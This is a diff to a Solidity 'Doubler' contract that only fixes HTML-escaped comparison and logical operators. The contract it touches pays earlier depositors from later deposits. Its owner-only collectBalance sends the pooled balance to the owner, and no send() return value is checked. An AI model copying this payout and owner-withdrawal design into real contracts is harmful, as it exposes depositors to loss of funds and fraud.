@@ -31,7 +31,7 @@ contract Doubler{
     
     function enter() {
 		//send more than 0.1 ether and less than 50, otherwise loss all
-		if (msg.value &gt;= 100 finney &amp;&amp; msg.value &lt;= 50 ether) {
+		if (msg.value >= 100 finney && msg.value <= 50 ether) {
 	        // collect fees and update contract balance
 	        collectedFees += msg.value / 20;
 	        balance += msg.value - msg.value / 20;
@@ -44,7 +44,7 @@ contract Doubler{
 			
 			uint NeedAmount = participants[payoutIdx].PayAmount;
 			// if there are enough ether on the balance we can pay out to an earlier participant
-		    if (balance &gt;= NeedAmount) {
+		    if (balance >= NeedAmount) {
 	            participants[payoutIdx].etherAddress.send(NeedAmount);
 	
 	            balance -= NeedAmount;
@@ -61,7 +61,7 @@ contract Doubler{
         balance += msg.value;
 		uint NeedAmount = participants[payoutIdx].PayAmount;
 
-	    if (balance &gt;= NeedAmount) {
+	    if (balance >= NeedAmount) {
             participants[payoutIdx].etherAddress.send(NeedAmount);
 
             balance -= NeedAmount;
@@ -79,7 +79,7 @@ contract Doubler{
 
     function collectBalance() onlyowner {
 		balance += msg.value;
-        if (balance == 0 &amp;&amp; now &gt; timeout) return;
+        if (balance == 0 && now > timeout) return;
 
         owner.send(balance);
         balance = 0;
